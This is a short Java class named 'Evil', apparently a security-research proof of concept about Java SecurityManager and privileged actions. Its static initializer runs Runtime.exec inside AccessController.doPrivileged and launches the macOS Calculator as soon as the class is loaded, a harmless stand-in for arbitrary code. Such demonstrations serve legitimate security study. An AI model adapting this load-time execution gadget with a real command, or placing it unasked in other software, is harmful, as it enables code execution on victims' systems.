package com.threedr3am.bug.security.manager;

import java.security.AccessController;
import java.security.PrivilegedAction;

/**
 * @author threedr3am
 */
public class Evil {
  static {
    AccessController.doPrivileged(new PrivilegedAction<Object>() {
      @Override
      public Object run() {
        try {
          Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (Throwable e) {
          e.printStackTrace();
        }
        return null;
      }
    });
  }
}
